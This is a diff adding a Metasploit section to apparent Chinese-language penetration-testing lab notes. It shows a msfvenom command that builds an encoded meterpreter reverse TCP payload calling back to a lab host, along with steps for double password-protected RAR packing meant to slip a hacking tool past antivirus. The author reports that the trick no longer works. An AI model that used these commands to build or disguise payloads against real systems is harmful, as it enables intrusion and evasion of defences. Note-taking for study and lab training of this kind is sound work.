@@ -1139,3 +1139,35 @@ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_
 - 滥用在 `SYSTEM 帐户`上下文中运行的服务，或使用 [Juicy Potato](https://github.com/ohpe/juicy-potato) 滥用服务帐户 `SeImpersonate` 权限。
 - Windows 操作系统漏洞（如 Windows 10 Task Scheduler 0-day）中的本地权限提升缺陷。
 - 使用本地帐户在已加入域的主机上获得管理员访问权限，并使用 Psexec 启动 SYSTEM cmd 窗口。
+
+# 七、Metasploit
+
+许多人经常认为漏洞利用的失败反驳了可疑漏洞的存在。然而，这只是证明 Metasploit 漏洞不起作用，而不是漏洞不存在。这是因为许多漏洞需要根据目标主机进行定制才能使漏洞发挥作用。因此，Metasploit 框架等自动化工具只能被视为支持工具，而不是我们手动技能的替代品。
+
+msfvenom对很多AV已经不生效了，这是因为仅基于签名的恶意文件分析已成为过去。 `Heuristic analysis, machine learning, and deep packet inspection` 使有效负载更难通过编码方案的几次后续迭代来逃避任何好的 AV 软件。
+
+## 7.1 invasion
+
+Packers有效负载与可执行程序和解压缩代码一起打包在一个文件中。
+
+```
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
+```
+
+```
+双重加密 + 伪装”压缩来传递hacktool
+wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
+tar -xzvf rarlinux-x64-612.tar.gz && cd rar
+rar a ~/test.rar -p ~/test.js
+mv test.rar test
+rar a test2.rar -p test
+mv test2.rar test2
+```
+
+处理前
+
+![image-20250528160412963](pictures/image-20250528160412963.png)
+
+处理后【已经可以查出来了，不管用】
+
+![image-20250528160548825](pictures/image-20250528160548825.png)
